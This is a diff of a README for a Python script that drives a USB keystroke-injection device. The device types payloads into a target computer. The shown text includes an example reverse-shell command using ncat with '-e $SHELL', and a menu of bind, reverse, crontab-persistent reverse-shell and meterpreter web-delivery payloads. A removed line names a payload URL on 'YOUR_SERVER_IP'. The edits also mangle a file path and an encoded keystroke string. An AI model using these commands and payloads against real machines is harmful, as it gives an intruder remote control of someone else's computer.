@@ -4,7 +4,7 @@ Where to buy a Neo injector ? I got mine from [Aliexpress](https://www.aliexpres
 
 ## How to use the script
 ```c
-python3 injector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt -h                 
+python3 injector.py -v --host 127.0.0.1 --port 4242 --payload payloads / windows.txt -h                 
 usage: injector.py [-h] [-v] [--host [HOST]] [--port [PORT]]
                        [--user [USER]] [--pass [PASS]] [--panel [PANEL]]
                        [--payload [PAYLOAD]]
@@ -34,7 +34,7 @@ $ python3 injector.py -v --host 127.0.0.1 --port 4444
                    __   °
                  <(o )___
                   ( ._> /
-                   `---'                      @pentest_swissky
+                   `---'                      @pxcs
 
 Enter a payload, eg: bash -c 'nohup ncat 127.0.0.1 4242 -e $SHELL &'
 -------------------------------------------------------------------
@@ -43,7 +43,7 @@ Payload:
 Rem:Default Payload
 Press:130+195
 CustomDelay:1000
-Print:bqsh 6c 4nohup ncqt !@&<)<)<! $$$$ 6e ]SHELL 14
+Print: bash SHELL:14
 CustomDelay:1000
 Press:176
 
@@ -56,7 +56,7 @@ Sending payload to http://192.168.1.1/runlivepayload
 | bind           | initiate a bind shell on results.port |
 | reverse        | initiate a reverse shell on results.host and results.port |
 | crontab        | set up a crontab reverse shell on results.host and results.port |
-| meterpreter [https://YOUR_SERVER_IP:4646/posh-payload] | use exploit/multi/script/web_delivery with a posh-payload    |
+| meterpreter | use exploit script / web delivery with a posh-payload    |
 | send some text | send the specified text              |
 | h              | help                                 |
 | q              | quit                                 |
